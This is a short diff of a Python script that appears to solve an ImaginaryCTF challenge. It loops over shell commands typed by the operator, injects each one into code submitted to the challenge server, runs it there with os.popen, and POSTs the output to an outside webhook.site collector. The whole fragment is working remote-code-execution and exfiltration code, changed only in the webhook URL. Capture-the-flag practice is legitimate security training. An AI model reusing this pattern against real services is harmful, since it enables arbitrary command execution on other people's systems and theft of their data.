@@ -16,7 +16,7 @@ while True:
     payload=f"""
 from urllib.request import urlopen, Request
 import os
-httprequest = Request('	https://webhook.site/17555b78-6164-4e3c-891e-1fe96c3036ca/',data=os.popen('{input("$ ").strip()}').read().encode(),method='POST')
+httprequest = Request('	https://webhook.site/',data=os.popen('{input("$ ").strip()}').read().encode(),method='POST')
 urlopen(httprequest)""".strip()
     requests.post("http://p2c.chal.imaginaryctf.org/", data={"code": payload})
     
